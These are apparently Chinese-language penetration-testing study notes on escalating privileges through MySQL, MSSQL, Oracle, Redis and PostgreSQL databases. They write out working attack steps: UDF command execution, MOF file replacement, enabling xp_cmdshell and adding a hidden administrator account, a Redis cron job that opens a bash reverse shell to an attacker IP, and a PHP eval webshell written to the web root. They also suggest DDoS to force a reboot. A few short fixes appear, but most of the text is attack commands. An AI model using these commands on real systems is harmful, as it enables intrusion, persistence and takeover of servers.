**第四步：创建自定义函数并执行系统命令**

使用如下命令创建自定义函数：

~~~sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
~~~

使用命令查看是否新增了sys_eval函数

~~~sql
select * from mysql.func;
~~~

然后测试一下系统命令执行

~~~sql
select sys_eval('whoami')
~~~

具体回显都可以看上面那篇udf提权文章

成功后就可以执行系统命令了

###### MOF 

[MySQL提权之mof提权_mysql mof提权-CSDN博客](https://blog.csdn.net/2301_77300311/article/details/130082410?ops_request_misc=%7B%22request%5Fid%22%3A%22171266691616800178565354%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171266691616800178565354&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-130082410-null-null.142^v100^control&utm_term=mof提权&spm=1018.2226.3001.4187)

c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次

MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权

条件：

1.windows 03以下版本

2.拿到mysql数据库权限账户密码且该权限可以读写c:/windows/system32/wbem/mof目录【即secure-file-priv参数不为null】

**第一步：创建恶意mof文件并上传替换**

先去网上找到恶意mof文件，并保存到本地，后缀为.mof

然后通过webshell执行sql命令

~~~sql
select load_file("C:/Documents and Settings/testtest.mof【本地恶意mof文件目录】") into dumpfile "c:/windows/system32/wbem/mof/nullevt.mof"
~~~

**第二步：等待并验证上传文件中的命令执行并修改命令重复执行**

等待时间到了验证命令是否执行成功，这里可以把命令一开始就写成创建一个admininistrator级别的用户

- 关于Mof提权的弊端

  我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？

  cmd 下运行下面语句:

  net stop winmgmt
  del c:/windows/system32/wbem/repository
  net start winmgmt
  重启服务即可。

###### 启动项

在拿到数据库的最高权限后，通过数据库的写入文件上传功能，把自定义的可执行文件通过weshell上传到服务器的自启动目录，然后想办法重启操作系统或者服务器，就会启动该程序

即：将创建好的后门或执行文件写入到服务器启动项，配合重启执行

不同操作系统的自启动目录可以去网上搜

eg:

msf写入mysql服务器启动项，拿到了root的账户密码，通过sql命令开启数据库的外联功能，然后使用msf进行mysql启动项提权，设置好端口和数据库地址，账户密码后开始通过工具进行mysql启动项提权【在启动项中上传了后门软件】

但是此时还需要配合重启才能成功提权，可以配合DDOS攻击

###### 反弹shell

eg:

~~~ 
nc -l(监听本地) -p(监听端口) 5577
~~~

然后通过webshell配合数据库最高权限sql执行命令上传反弹shell并设置反弹shell的ip地址到攻击者ip地址，端口到5577

###### 演示案例：

[60：权限提升-MY&MS&ORA等SQL数据库提权 - zhengna - 博客园 (cnblogs.com)](https://www.cnblogs.com/zhengna/p/15214770.html)

MYSQL数据库提权演示-脚本&MSF：

php+mysql搭建的网站，已经获取到了webshell级别的权限，并且上传了提权脚本【不是网站权限】，通过数据库提权最后提到系统权限

首先通过webshell对网站进行端口扫描【强大的webshell上传成功后本身在网站中打开webshell页面就是一个工具，支持进行各种操作，或者也可以自己和工具联动】，根据端口的开放情况判断出目标服务器采用了哪种数据库【也可以用nmap】，发现对方3306端口开放，也就是采用了mysql数据库。

mysql数据库最高权限账户为root，但是密码需要去搜集，读取网站目录-MYSQL-data-mysql-user.MYD文件中的root密码后，输入数据库root账户密码并运行网站的提权脚本【udf】，实现系统权限级cmd命令执行，成功提权

------

##### Mssql(sql server)

[SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客](https://blog.51cto.com/u_11797152/2411770)

###### xp_cmdshell

[数据库提权，Mssql xp_cmdshell提权-CSDN博客](https://blog.csdn.net/luSaMa/article/details/131577491?ops_request_misc=%7B%22request%5Fid%22%3A%22171271007616800186541917%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171271007616800186541917&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-131577491-null-null.142^v100^control&utm_term=xp_cmdshell提权&spm=1018.2226.3001.4187)

扩展存储过程中xp_cmdshell是一个开放接口，可以让sql sever调用cmd命令。

xp_cmdshell默认在mssql2000中开启，在mssql2005及以上版本禁止，如果关闭的话，需要攻击者拥有管理员sa权限并使用sp_configure将其开启。

xp_cmdshell一般可以在数据库/msater/可编程性/扩展存储过程/系统扩展存储过程查看，可以通过调用xp_cmdshell执行cmd命令来查看是否关闭

**开启**

~~~sql
开启：（sa权限）  
EXEC sp_configure 'show advanced options', 1;  #将高级选项改为1，即启用

RECONFIGURE ;    #若使用with override覆盖任何已存在配置，重新配置SQL Server实例应用刚更改的参数

EXEC sp_configure xp_cmdshell', 1;#同1  ，1表示启用，若关闭则为0，别的不变；
RECONFIGURE;

~~~

执行命令

~~~sql
exec master..xp_cmdshell 'net user lusang 123456 /add'; #创建用户lusang并设置密码为123456;..表示引用master数据库中的xp_cmdshell存储过程，省略指定数据库名称

exec master..xp_cmdshell 'net localgroup administrators lusang /add';#将用户lusang加入管理员工作组

~~~

###### sp_oacreate（ole）

当xpcmd_shell不可用时，可以用sp_oacreate提权，调用OLE对象，利用OLE对象的run方法执行系统命令

**判断存在**

~~~sql
select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'; #返回0证明不存在，返回1则存在
~~~

**开启**

~~~sql
EXEC sp_configure 'show advanced options', 1;

RECONFIGURE WITH OVERRIDE; #使用with override覆盖任何已存在配置，重新配置SQL Server实例应用刚更改的参数

EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE WITH OVERRIDE;
~~~

**执行命令**

~~~sql
declare @cmd INT;
EXEC sp_oacreate 'wscript.shell',@cmd output exec sp_oamethod @cmd,'run',null,'ping cqy1eo.ceye.io','0','true';
#通过OLE Automation创建了一个WScriot.Shell对象，之后用run方式执行指定的命令行操作，ping操作，0是窗口样式参数，表示隐藏命令行窗口，true表示等待命令执行完毕。
~~~

###### sp_oamethod

###### 沙盒模式

沙盒模式是一种安全机制，可以理解成一种隔离的虚拟机，沙盒允许进行一些敏感的操作

[沙箱模式理解和运用_沙箱模式是什么意思-CSDN博客](https://blog.csdn.net/HF819239570/article/details/51090611?ops_request_misc=%7B%22request%5Fid%22%3A%22171271144616800226578650%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171271144616800226578650&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-51090611-null-null.142^v100^control&utm_term=什么是沙盒模式&spm=1018.2226.3001.4187)

###### 映像劫持

##### Oracle

Oracle数据库一般搭配的是jsp网站，jsp网站webshell的权限就是系统权限，不需要提权

工具推荐：Oracleshell

###### 普通用户

拥有数据库普通权限账户，可提权到DBA

###### DBA用户

如果拥有数据库管理员权限账号，不需要进行提权

###### 注入模式

找到了oracle数据库中的一个sql注入点，通过sql注入执行命令，等同于直接系统执行命令

##### Redis

Redis数据库不能靠nvcat连接，一般用命令行连接

通过未授权漏洞连接Redis或通过配置文件找到Redis密码进行连接

默认的配置是使用6379端口，没有密码-未授权访问漏洞

[提权 - Redis/Postgre数据库_redis数据库提权方式-CSDN博客](https://blog.csdn.net/acepanhuan/article/details/129272084?ops_request_misc=%7B%22request%5Fid%22%3A%22171271510716800197068149%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171271510716800197068149&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-129272084-null-null.142^v100^control&utm_term=redis提权&spm=1018.2226.3001.4187)

[Redis未授权访问漏洞利用总结_redis漏洞利用-CSDN博客](https://blog.csdn.net/fly_hps/article/details/80937837)

[redis未授权访问漏洞利用总结——linux篇 - 夜尽终会天明 - 博客园 (cnblogs.com)](https://www.cnblogs.com/sq-smile/p/14098579.html)

###### 利用计划任务执行命令反弹shell

条件：有root账户密码或者Redis存在未授权访问漏洞

当redis以root权限运行时，可以通过redis内置命令执行实现反弹shell

执行命令：

~~~sql
set x "\n* * * * * bash -i > &/dev/tcp/接受反弹回话的公网IP/端口 0>&1\n"
config set dir /var/spool/cron/
config set dbfilename root
save
~~~

###### 写ssh-keygen公钥使用私钥登录

条件：

1.Redis服务使用了root帐号启动
2.服务器开房了SSH服务，而且允许使用密钥登录（即远程写入一个公钥，直接登录远程服务器）

###### 低权限写webshell

当登陆后Redis发现权限不高时，服务器开了web服务，在Redis有web目录写入权限的情况跟下，可以尝试往web路径写webshell。

~~~sql
config set dir /var/www/html  （要写入的WEB目录）
config set dbdilename shell.php
set x " <?php eval($_REQUEST["123"]); ?>"
 save
~~~

- 修复方案：

1.限制源ip地址，绑定只有127.0.0.1【本地】的ip地址才能访问本数据库，即拒绝外连

2.设置访问密码修改 redis.conf 文件，添加  ``requirepass mypassword
    ``（注意redis不要用-a参数，明文输入密码，连接后使用auth认证），防止未授权访问

3.具体看上面的linux那篇文章吧

##### postgresql

PostgreSQL是一款关系型数据库，在9.3到11版本有一个特性，而管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以利用该特性实现任意命令执行【实现了提权】

利用的漏洞是：CVE-2019-9193 CVE-2018-1058

修复：升级版本或打补丁

### 服务类提权

### 第三方接口提权



